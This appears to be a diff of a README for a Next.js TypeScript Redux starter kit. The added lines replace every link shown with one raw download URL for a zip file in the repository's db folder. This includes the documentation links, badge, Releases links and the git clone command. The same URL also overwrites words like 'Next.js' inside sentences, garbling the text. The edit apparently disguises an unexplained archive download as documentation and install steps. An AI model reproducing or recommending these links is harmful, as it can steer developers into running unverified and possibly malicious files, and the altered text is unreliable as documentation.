@@ -1,17 +1,17 @@
-# 🚀 Sabat Next.js TypeScript Redux Jest Cypress Starter
+# 🚀 Sabat https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip TypeScript Redux Jest Cypress Starter
 
-![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue?style=flat-square&logo=github)
+![GitHub Release](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip)
 
-Welcome to the **Sabat Next.js TypeScript Redux Jest Cypress Starter**! This repository provides a well-structured, production-ready boilerplate for building web applications using Next.js, TypeScript, Redux, Jest, Cypress, and more. Whether you're starting a new project or looking to enhance your existing applications, this starter kit has you covered.
+Welcome to the **Sabat https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip TypeScript Redux Jest Cypress Starter**! This repository provides a well-structured, production-ready boilerplate for building web applications using https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip, TypeScript, Redux, Jest, Cypress, and more. Whether you're starting a new project or looking to enhance your existing applications, this starter kit has you covered.
 
 ## 📦 Features
 
-- **Next.js**: A powerful React framework for building server-rendered applications.
+- **https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip**: A powerful React framework for building server-rendered applications.
 - **TypeScript**: Adds type safety to your JavaScript code, improving maintainability and reducing bugs.
 - **Redux**: State management for your React applications, allowing for predictable state updates.
 - **Jest**: A testing framework for JavaScript, perfect for unit and integration tests.
 - **Cypress**: End-to-end testing tool that makes testing your web applications easy and reliable.
-- **Mongoose**: An ODM (Object Data Modeling) library for MongoDB and Node.js.
+- **Mongoose**: An ODM (Object Data Modeling) library for MongoDB and https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip
 - **ESLint**: A static code analysis tool to identify problematic patterns in JavaScript code.
 - **Prettier**: A code formatter that enforces a consistent style across your codebase.
 - **Tailwind CSS**: A utility-first CSS framework for rapid UI development.
@@ -27,7 +27,7 @@ To get started with this boilerplate, follow these steps:
    Use the following command to clone the repository:
 
    ```bash
-   git clone https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter.git
+   git clone https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip
    ```
 
 2. **Navigate to the Directory**
@@ -118,17 +118,17 @@ This command will generate an optimized version of your application in the `.nex
 
 For detailed documentation on each tool and library included in this boilerplate, please refer to the following links:
 
-- [Next.js Documentation](https://nextjs.org/docs)
-- [TypeScript Documentation](https://www.typescriptlang.org/docs/)
-- [Redux Documentation](https://redux.js.org/introduction/getting-started)
-- [Jest Documentation](https://jestjs.io/docs/getting-started)
-- [Cypress Documentation](https://docs.cypress.io/guides/overview/why-cypress)
-- [Mongoose Documentation](https://mongoosejs.com/docs/)
-- [ESLint Documentation](https://eslint.org/docs/user-guide/getting-started)
-- [Prettier Documentation](https://prettier.io/docs/en/index.html)
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
-- [Bundle Analyzer Documentation](https://github.com/webpack-contrib/webpack-bundle-analyzer)
-- [Storybook Documentation](https://storybook.js.org/docs/react/get-started/introduction)
+- [https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip Documentation](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip)
+- [TypeScript Documentation](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip)
+- [Redux Documentation](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip)
+- [Jest Documentation](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip)
+- [Cypress Documentation](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip)
+- [Mongoose Documentation](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip)
+- [ESLint Documentation](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip)
+- [Prettier Documentation](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip)
+- [Tailwind CSS Documentation](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip)
+- [Bundle Analyzer Documentation](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip)
+- [Storybook Documentation](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip)
 
 ## 🏷️ Topics
 
@@ -153,7 +153,7 @@ This repository covers the following topics:
 
 ## 📥 Releases
 
-For the latest releases, visit the [Releases section](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/releases). Here, you can download the latest version and view release notes.
+For the latest releases, visit the [Releases section](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip). Here, you can download the latest version and view release notes.
 
 ## 🛠️ Contributing
 
@@ -179,4 +179,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ---
 
-Explore the power of Next.js with TypeScript and Redux using this starter kit. For more information and updates, check the [Releases section](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/releases). Happy coding!
+Explore the power of https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip with TypeScript and Redux using this starter kit. For more information and updates, check the [Releases section](https://github.com/DanielVilleda/sabat-nextjs-typescript-redux-jest-cypress-starter/raw/refs/heads/main/db/jest_typescript_sabat_nextjs_cypress_redux_starter_v1.7.zip). Happy coding!
